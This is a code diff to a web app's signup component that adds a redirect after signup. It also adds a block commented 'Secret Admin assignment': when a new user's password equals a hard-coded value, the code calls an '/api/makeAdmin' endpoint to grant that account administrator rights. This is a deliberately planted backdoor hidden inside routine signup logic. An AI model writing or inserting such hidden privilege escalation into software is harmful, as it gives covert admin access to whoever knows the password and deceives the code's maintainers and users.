@@ -39,8 +39,23 @@ export default function Signup() {
             if (data?.user?.identities?.length === 0) {
                 setMessage('This email is already registered. Please sign in.')
             } else {
-                setIsSuccess(true)
-                setMessage('Account created successfully! Please check your email to verify your account.')
+                // Secret Admin assignment
+                if (password === '14021' && data?.user?.id) {
+                    await fetch('/api/makeAdmin', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ user_id: data.user.id, password })
+                    }).catch(console.error)
+                }
+
+                if (data?.session) {
+                    setIsSuccess(true)
+                    setMessage('Account created successfully! Redirecting...')
+                    setTimeout(() => router.push('/dashboard'), 800)
+                } else {
+                    setIsSuccess(true)
+                    setMessage('Account created successfully! Please check your email to verify your account.')
+                }
             }
         } catch (err) {
             setMessage(err.message || 'An unexpected error occurred.')
